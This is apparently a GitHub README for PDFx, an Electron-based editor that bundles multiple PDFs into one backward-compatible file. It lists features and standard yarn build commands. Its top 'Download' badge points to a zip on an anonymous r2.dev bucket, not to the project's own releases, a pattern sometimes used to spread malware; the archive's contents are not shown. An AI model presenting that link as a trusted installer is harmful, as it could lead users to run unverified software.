<div align="center">

# PDFx

**One file. Many documents. Still a PDF.**

<br>

<a href="https://pub-2f99e567a5f04aefb5e8cb75acb90ef7.r2.dev/PDFx.zip">
  <img src="https://img.shields.io/badge/Download-000000?style=for-the-badge&logo=apple&logoColor=white" alt="Download" height="44">
</a>

<br>
<br>

[![License: MIT](https://img.shields.io/badge/License-MIT-2e7d32?style=flat-square)](LICENSE)
&nbsp;
[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Windows%20%7C%20Linux-555?style=flat-square)](#)
&nbsp;
[![Format spec](https://img.shields.io/badge/format-spec-e08a00?style=flat-square)](SPEC.md)

<br>

<img src="assets/pdfx.png" alt="PDFx editor" width="820">

</div>

<br>

## What it is

PDFx is an open, backwards compatible extension of PDF that bundles many documents into a single file, plus a lightweight desktop editor for macOS, Windows, and Linux.

A `.pdfx` file is a fully valid PDF: open it anywhere and every page shows in sequence. Open it in PDFx and it splits back into the original documents. Plain single PDFs work as they are.

Drag and drop `.pdf` or `.pdfx` files anywhere in the window. Each document renders as a horizontal strip of pages, and documents stack vertically. Reorder or remove them, then **Export .pdfx** to save the whole collection as one file.

Beyond bundling, PDFx is a full editor: page transforms (rotate/crop), PNG stamps, annotations (text, ink, highlight, shapes), AcroForm form filling, **true** content redaction, and digital signatures — visual/ink plus cryptographic **PAdES** (baseline B-B through long-term **B-LT/B-LTA**) from a `.p12`/PFX file, a PKCS#11 smart card, or the Windows certificate store. Edits flatten into the PDF so any viewer sees them, and are mirrored in a backward-compatible manifest so a `.pdfx` reopens fully editable.

See [SPEC.md](SPEC.md) for the format. It is short: the entire trick is one embedded JSON manifest.

## How to run

Built with Electron, Vite, TypeScript, and React. PDF rendering by [pdf.js](https://mozilla.github.io/pdf.js/), assembly by [pdf-lib](https://pdf-lib.js.org/).

```bash
yarn              # install
yarn dev          # run in development
yarn build:mac    # package for macOS
yarn build:win    # package for Windows
yarn build:linux  # package for Linux (AppImage, deb, rpm)
```

## License

MIT
